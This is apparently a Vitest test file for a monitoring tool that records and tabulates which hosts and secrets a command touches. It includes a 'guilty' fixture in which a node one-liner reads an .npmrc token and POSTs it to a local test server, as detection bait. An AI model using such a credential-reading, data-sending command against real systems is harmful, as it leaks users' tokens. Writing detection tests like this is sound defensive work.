import { spawnSync } from 'node:child_process';
import fs from 'node:fs';
import path from 'node:path';
import { beforeAll, describe, expect, it } from 'vitest';
import { ensureBuilt, ROOT, runTattle, tmpDir, startHttp } from './helpers.js';

describe('hall/build-table.mjs', () => {
  beforeAll(ensureBuilt);

  it('builds a markdown table from fixture receipts (verdict, hosts, secrets, id)', async () => {
    const dir = tmpDir('tattle-hall-');
    const copy = (r: { logPath: string }, name: string) => fs.cpSync(path.dirname(r.logPath), path.join(dir, name), { recursive: true });
    const clean = await runTattle(['node', '-e', '0']);
    copy(clean, 'clean');
    const home = tmpDir('tattle-hall-home-');
    fs.writeFileSync(path.join(home, '.npmrc'), 'token');
    const srv = await startHttp();
    const guilty = await runTattle(
      ['node', '-e', `const s=require('fs').readFileSync(require('path').join(process.env.H,'.npmrc'));const r=require('http').request({host:'127.0.0.1',port:${srv.port},method:'POST'},x=>x.resume());r.end(s)`],
      { H: home, HOME: home, USERPROFILE: home },
      ['--include-local'],
    );
    await srv.close();
    copy(guilty, 'guilty');
    fs.mkdirSync(path.join(dir, 'broken'));
    fs.writeFileSync(path.join(dir, 'broken', 'receipt.json'), '{not json');

    const out = path.join(dir, 'HALL.md');
    const r = spawnSync(process.execPath, [path.join(ROOT, 'hall', 'build-table.mjs'), dir, out], { encoding: 'utf8' });
    expect(r.status).toBe(0);
    const md = fs.readFileSync(out, 'utf8');
    const ids = [clean, guilty].map((x) => JSON.parse(fs.readFileSync(path.join(path.dirname(x.logPath), 'receipt.json'), 'utf8')).id as string);
    for (const id of ids) expect(md).toContain(id);
    expect(md).toMatch(/\| CLEAN \| none \| none \|/);
    expect(md).toMatch(/127\.0\.0\.1 \(unknown, loopback\)/);
    expect(md).toMatch(/npm auth config/);
    expect(md).toContain('## Unreadable receipts');
    expect(md.indexOf(ids[1]!)).toBeLessThan(md.indexOf(ids[0]!)); // worse verdicts first
  });

  it.skipIf(process.platform === 'win32')('run.sh --dry-run lists commands, never executes them', () => {
    const r = spawnSync('bash', [path.join(ROOT, 'hall', 'run.sh'), '--dry-run', '--out', tmpDir('tattle-hall-out-')], { encoding: 'utf8' });
    expect(r.status).toBe(0);
    expect(r.stdout).toMatch(/done: ran=0/);
  });
});
